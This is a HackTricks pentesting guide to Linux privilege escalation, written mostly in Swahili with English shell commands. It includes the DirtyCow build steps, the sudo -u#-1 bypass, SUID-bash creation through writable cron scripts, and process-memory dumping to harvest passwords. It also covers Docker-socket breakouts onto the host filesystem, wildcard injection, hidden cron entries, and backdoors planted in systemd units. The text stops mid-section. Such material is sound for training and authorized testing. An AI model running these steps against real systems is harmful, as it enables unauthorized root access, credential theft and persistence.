# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata habari kuhusu OS inayoendesha
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **write permissions kwenye folda yoyote ndani ya `PATH`** unaweza ku-hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je kuna taarifa zenye kuvutia, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na kama kuna exploit yoyote inayoweza kutumika kuinua privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo na udhaifu na baadhi ya **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel yenye udhaifu kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (endesha KATIKA mjeruhi, inakagua tu exploits za kernel 2.x)

Kila wakati **tafuta toleo la kernel kwa Google**, labda toleo lako la kernel limeandikwa katika exploit fulani ya kernel na kwa hivyo utakuwa na uhakika kwamba exploit hii ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo hatarishi ya sudo yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg uthibitishaji wa saini ulishindikana

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi hii vuln inaweza kutumika
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya mfumo enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha mbinu za ulinzi zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container, unaweza kujaribu kutoroka kutoka kwake:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **ni nini mounted na unmounted**, wapi na kwa nini. Ikiwa chochote kipo unmounted, unaweza kujaribu ku-mount na kuangalia taarifa za kibinafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **any compiler is installed**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwani inashauriwa kui-compile kwenye mashine utakayoitumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizowekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumiwa kwa escalating privileges…\
Inashauriwa kukagua kwa mikono toleo la programu zilizowekwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa sehemu kubwa hazitakuwa za manufaa, kwa hivyo inashauriwa kutumia programu kama OpenVAS au programu zinazofanana zitakazokagua kama toleo lolote la programu iliyosakinishwa lina udhaifu dhidi ya exploits zinazojulikana_

## Michakato

Tazama **ni michakato gani** inaendeshwa na ukague ikiwa mchakato wowote una **ruhusa zaidi kuliko inavyopaswa** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** zinabaini hayo kwa kuchunguza vigezo `--inspect` ndani ya mstari wa amri wa mchakato.\
Pia **angalia ruhusa zako juu ya binary za michakato**, labda unaweza kuandika juu ya binari ya mtu mwingine.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kutambua michakato dhaifu inayotekelezwa mara kwa mara au wakati vigezo fulani vimetimizwa.

### Kumbukumbu ya mchakato

Huduma kadhaa za seva huhifadhi **credentials kwa maandishi wazi ndani ya kumbukumbu**.\
Kawaida utahitaji **root privileges** kusoma kumbukumbu za michakato zinazomilikiwa na watumiaji wengine, kwa hivyo hii mara nyingi ni ya manufaa zaidi ukiwa tayari root na unapotaka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu za michakato unazomiliki**.

> [!WARNING]
> Kumbuka kwamba sasa hivi mashine nyingi **haziruhusu ptrace kwa chaguo-msingi** na hiyo inamaanisha huwezi dump michakato mingine inayomilikiwa na mtumiaji wako asiye na ruhusa.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: michakato yote inaweza kuchunguzwa kwa debugger, mradi tu zina uid sawa. Hii ni njia ya jadi jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi pekee unaweza kufanyiwa debugging.
> - **kernel.yama.ptrace_scope = 2**: Ni admin pekee anayeweza kutumia ptrace, kwani inahitaji capability ya CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna michakato inaweza kufuatiliwa na ptrace. Mara imewekwa, inahitajika reboot ili kuwezesha ptracing tena.

#### GDB

Ikiwa una ufikiaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato fulani, **maps zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia zinaonyesha **ruhusa za kila eneo lililopangwa**. Faili bandia ya **mem** inaonyesha kumbukumbu ya mchakato yenyewe. Kutoka kwenye faili ya **maps** tunajua ni **eneo gani za kumbukumbu zinazoweza kusomwa** na ofseti zao. Tunatumia taarifa hii **kutafuta ndani ya faili ya mem na kumwaga (dump) maeneo yote yanayosomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` inatoa ufikiaji wa kumbukumbu ya **fizikali** ya mfumo, si kumbukumbu ya virtual. Eneo la anwani la virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni toleo la Linux lililobuniwa upya la chombo cha ProcDump kutoka kwenye kifurushi cha zana za Sysinternals za Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili kuchomoa kumbukumbu ya mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - _Unaweza kwa mikono kuondoa mahitaji ya root na kuchomoa mchakato unaomilikiwa na wewe_
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Vifikisho kutoka Kumbukumbu za Mchakato

#### Mfano wa mkononi

Iwapo utagundua kwamba mchakato wa authenticator unaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kufanya dump ya process (angalia sehemu zilizotangulia ili kupata njia mbalimbali za dump memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itakuwa **kuiba cheti za maandishi wazi kutoka memory** na kutoka kwa baadhi ya **faili zinazojulikana vizuri**. Inahitaji vibali vya root ili ifanye kazi vizuri.

| Kipengele                                          | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| Nenosiri la GDM (Kali Desktop, Debian Desktop)    | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regexes za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa/Cron

Angalia kama kuna kazi iliyopangwa inayoweza kuwa dhaifu. Labda unaweza kuchukua fursa ya script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha faili ambazo root anazitumia? tumia symlinks? unda faili maalum katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Iwapo ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa mbele ya njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mbinu zaidi za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cron script overwriting and symlink

Ikiwa **unaweza kubadilisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una full access**, inaweza kuwa ya manufaa kufuta folder hiyo na **kuunda symlink folder kuelekea nyingine** inayohudumia script unayedhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia michakato ili kutafuta zile zinazotekelezwa kila dakika 1, 2 au 5. Labda unaweza kuchukua faida yake na escalate privileges.

Kwa mfano, ili **fuatilia kila 0.1s kwa muda wa dakika 1**, **panga kwa amri zilizotekelezwa kidogo** na kufuta amri ambazo zimeendeshwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda a cronjob kwa **kuweka carriage return baada ya comment** (bila newline character), na the cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Fayili za _.service_ zinazoweza kuandikwa

Angalia ikiwa unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili i**ite** backdoor yako wakati huduma inapo**anza**, **inaporudiwa** au **inaposimamishwa** (labda utahitaji kusubiri mpaka mashine ireboot).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Binaries za service zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **write permissions over binaries being executed by services**, unaweza kuzibadilisha kwa backdoors ili wakati services zitakapotekelezwa tena backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa ugundua kwamba unaweza **kuandika** katika yoyote ya folda kwenye njia hiyo, huenda ukaweza **kupandisha ruhusa**. Unahitaji kutafuta faili za usanidi za service zinazotumia **relative paths**, kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, unda **executable** yenye **jina lile lile kama relative path binary** ndani ya systemd PATH folder unayoweza kuandika, na wakati service itaombwa kutekeleza kitendo chenye udhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itaendeshwa (watumiaji wasio na vibali kawaida hawawezi kuanzia/kusimamisha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo jina lao linaishia kwa `**.timer**` ambazo zinaendesha `**.service**` files au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwani zina msaada uliojengwa kwa ajili ya matukio ya kalenda na matukio ya monotonic time na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya units za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
> Unit itakayotekelezwa wakati timer hii itakapotimia. Hoja ni jina la unit, ambalo kiambishi mwisho si ".timer". Ikiwa haibainishwi, thamani hii kwa chaguo-msingi inaangukia kwenye service ambayo ina jina sawa na timer unit, isipokuwa kwa kiambishi mwisho. (Tazama hapo juu.) Inashauriwa kwamba jina la unit linalowashwa na jina la unit la timer vitaitwa kwa njia ile ile, isipokuwa kwa kiambishi mwisho.

Kwahivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Pata systemd unit fulani (kama a `.service`) ambayo inatekeleza **binary inayoweza kuandikwa**
- Pata systemd unit fulani ambayo inatekeleza **relative path** na una **idhini za kuandika** juu ya **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwawezesha Timer**

Ili kuwezesha timer unahitaji root privileges na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inakuwa **imewezeshwa** kwa kuunda symlink kuelekea kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **mawasiliano ya mchakato** kwenye mashine moja au tofauti ndani ya modeli za client-server. Zinatumia faili za descriptor za Unix kwa mawasiliano kati ya kompyuta na zinawekwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini kwa muhtasari hutumika **kuonyesha wapi itaisikiliza** socket (njia ya faili ya AF_UNIX socket, anwani za IPv4/6 na/au nambari ya bandari ya kusikiliza, n.k.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **kila instance ya service itazaliwa kwa kila muunganisho unaoingia** na socket ya muunganisho pekee ndio itapitishwa kwake. Ikiwa **false**, sockets zote zinazolisikilizwa zitatumwa kwa `service unit` iliyozinduliwa, na service unit moja tu itazalishwa kwa miunganisho yote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo `service unit` moja bila masharti inashughulikia trafiki yote inayoingia. **Defaults to false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mistari ya amri moja au zaidi, ambayo hufanywa **kabla** au **baada** ya sockets/FIFOs zinazolisikilizwa **kuundwa** na ku-bind, mtawalia. Token ya kwanza ya mstari wa amri lazima iwe jina la faili kamili (absolute filename), ikifuatiwa na vigezo kwa mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo hufanywa **kabla** au **baada** ya sockets/FIFOs zinazolisikilizwa **kufungwa** na kuondolewa, mtawalia.
- `Service`: Inaeleza jina la `service unit` **kuzinduliwa** kwa **trafiki inayokuja**. Mipangilio hii inaruhusiwa tu kwa sockets zenye `Accept=no`. Kwa default inarejea service yenye jina sawa na socket (kwa kubadilisha suffix). Kwa kawaida, haitakuwa muhimu kutumia chaguo hili.

### Writable .socket files

Ikiwa unapata `.socket` file **inaoweza kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket itakavyoundwa. Kwa hivyo, **labda utahitaji kusubiri hadi mashine iwashe upya (reboot).**\
_Na kumbuka mfumo lazima utumie usanidi huo wa socket file au backdoor haitatekelezwa_

### Writable sockets

Ikiwa unagundua **socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si `.socket` config files_), basi **unaweza kuwasiliana** na socket hiyo na labda exploit udhaifu.

### Orodha ya Unix Sockets
```bash
netstat -a -p --unix
```
### Unganisho ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwa na baadhi ya **sockets listening for HTTP** requests (_sina maana ya .socket files bali mafaili yanayotenda kama unix sockets_). Unaweza kukagua hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa HTTP** ombi, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Writable Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa default, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kikundi cha `docker`. Kuwa na ufikiaji wa kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hili linafanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation kwa kutumia Docker CLI**

Ikiwa una ufikiaji wa kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container yenye ufikiaji wa root kwenye filesystem ya host.

#### **Kutumia Docker API Moja kwa moja**

Katika matukio ambapo Docker CLI haipo, Docker socket bado inaweza kubadilishwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi la kuunda container inayochomeka (mounts) directory ya root ya mfumo wa host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha muunganisho kwa container, kuruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na ufikiaji wa root kwenye filesystem ya host.

### Mengine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **ndani ya kundi `docker`** una [**njia zaidi za kupandisha ruhusa**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API inasikiliza kwenye port** unaweza pia kuweza kuiponda](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kutoka kutoka docker au kuitumia vibaya kupandisha ruhusa** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) kupandisha ruhusa

Ikiwa unagundua kuwa unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwani **unaweza kuwa na uwezo wa kuitumia vibaya ili kupandisha ruhusa**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** kupandisha ruhusa

Ikiwa unagundua kuwa unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwani **unaweza kuwa na uwezo wa kuitumia vibaya ili kupandisha ruhusa**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa hali ya juu wa **inter-Process Communication (IPC)** unaowawezesha programu kuingiliana kwa ufanisi na kushiriki data. Umeundwa kwa kuzingatia mfumo wa kisasa wa Linux, hutoa mfumo thabiti kwa aina mbalimbali za mawasiliano ya programu.

Mfumo huu ni mwingi kwa matumizi, unaounga mkono IPC ya msingi inayoboreshwa kubadilishana data kati ya mchakato, ikikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia kutangaza matukio au ishara, kukuza muunganisho usio na mshono kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayoingia inaweza kusababisha player ya muziki kutulia (mute), kuboresha uzoefu wa mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote object, kurahisisha maombi ya huduma na kuitwa kwa method kati ya programu, ikipunguza ugumu wa michakato iliyokuwa ngumu hapo awali.

D-Bus inafanya kazi kwa kutumia mfumo wa **allow/deny**, ikisimamia ruhusa za ujumbe (mfano method calls, signal emissions, n.k.) kwa msingi wa athari jumla ya kanuni za sera zinazofanana. Sera hizi zinaeleza mwingiliano na bus, na zinaweza kuruhusu kupandishwa kwa ruhusa kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hii katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukielezea ruhusa kwa mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera ambazo hazina mtumiaji au kundi maalum zinaweza kutumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wote ambao hawajafunikwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati ku-enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
